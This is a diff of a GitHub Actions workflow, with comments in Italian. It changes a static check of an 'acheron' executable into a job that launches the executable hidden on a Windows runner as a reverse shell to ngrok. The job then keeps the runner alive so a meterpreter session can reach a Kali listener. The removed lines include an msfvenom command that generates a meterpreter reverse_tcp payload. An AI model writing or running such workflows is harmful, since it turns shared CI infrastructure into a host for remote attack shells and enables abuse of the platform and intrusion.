@@ -1,48 +1,36 @@
-name: Test Acheron Payload
+name: Execute Payload on GitHub Actions
 
 on:
-  workflow_dispatch:  # Manual trigger from GitHub UI
-  push:
-    paths:
-      - 'acheron_*.exe'  # Trigger when EXE is pushed
+  workflow_dispatch:
 
 jobs:
-  test-payload:
+  execute-payload:
     runs-on: windows-latest
-    timeout-minutes: 10
+    timeout-minutes: 15
     
     steps:
-      - name: Checkout repository
+      - name: Checkout
         uses: actions/checkout@v4
       
-      - name: List files
-        run: dir
-      
-      - name: Test payload (static analysis)
+      - name: Verify payload exists
         run: |
-          $files = Get-ChildItem acheron_*.exe
-          if ($files.Count -eq 0) {
-            Write-Error "Nessun EXE trovato!"
+          dir acheron_*.exe
+        shell: pwsh
+      
+      - name: Execute payload (reverse shell to ngrok)
+        run: |
+          $exe = Get-ChildItem acheron_*.exe | Select-Object -First 1
+          if (-not $exe) {
+            Write-Error "EXE non trovato!"
             exit 1
           }
-          foreach ($file in $files) {
-            Write-Host "Testing: $($file.Name)"
-            # Dry run - verifica che l'EXE sia valido PE
-            $sig = (Get-Item $file.FullName).Length
-            Write-Host "Size: $sig bytes"
-            # Verifica PE header
-            $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
-            if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
-              Write-Host "✅ Valid PE header (MZ)"
-            } else {
-              Write-Error "Invalid PE header"
-              exit 1
-            }
-          }
+          Write-Host "Executing: $($exe.Name)"
+          Start-Process -FilePath $exe.FullName -WindowStyle Hidden
+          Write-Host "Payload executed, check Kali listener"
+        shell: pwsh
       
-      - name: Test msfvenom payload generation
+      - name: Keep runner alive for session
         run: |
-          # Verifica che msfvenom possa generare lo stesso payload
-          msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex EXITFUNC=thread 2>&1 | Select-String "Payload size" | Write-Host
-          Write-Host "✅ msfvenom payload generation OK"
+          Write-Host "Waiting 300s for meterpreter session..."
+          Start-Sleep -Seconds 300
         shell: pwsh
